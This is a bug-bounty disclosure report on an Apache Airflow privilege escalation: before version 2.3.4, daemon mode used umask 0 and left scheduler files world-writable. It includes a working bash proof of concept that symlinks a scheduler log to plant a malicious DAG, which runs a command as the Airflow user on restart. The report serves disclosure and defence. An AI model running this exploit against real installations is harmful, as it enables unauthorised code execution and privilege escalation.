# Airflow Daemon Mode Insecure Umask Privilege Escalation

## Report Details
- **Report ID**: 1690093
- **URL**: https://hackerone.com/reports/1690093
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-09-02T22:36:31.551Z
- **Disclosed**: 2022-09-17T12:23:18.068Z

## Reporter
- **Username**: nyymi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Apache Airflow prior to 2.3.4 had multiple components with an insecure daemon umask of 0, resulting in critical files and directories to be world writable. As such, any local user can infer Airflow to process specially crafted input and ultimately perform a privilege escalation to user executing Airflow. In particular the scheduler component is exploitable.

This is CWE-277: Insecure Inherited Permissions

The vulnerability and fix was announced as https://www.openwall.com/lists/oss-security/2022/09/02/3

# Proof of concept

The following attack works against the demo installation of Apache Airflow (when `airflow scheduler` is run with the `--daemon` flag):
```
#!/bin/bash
TARGET=/home/airflow
umask 0
cd $TARGET/logs/scheduler/latest/native_dags/example_dags
rm example_bash_operator.py.log
ln -s $TARGET/dags/poc.py example_bash_operator.py.log
until [ -f $TARGET/dags/poc.py ]
do
  sleep 1
done
rm example_bash_operator.py.log
(cat <<'EOF'
import os
os.system("id >>/tmp/pwned")
from airflow import DAG
EOF
) > $TARGET/dags/poc.py
```
The injected DAG payload (code execution) is triggered when the Airflow scheduler is restarted. This simple PoC performs a full arbitrary code execution, but other means of gaining control via custom DAGs exist as well.

## Impact

Privilege escalation: loss of confidentiality, integrity and availability

## Attachments
No attachments
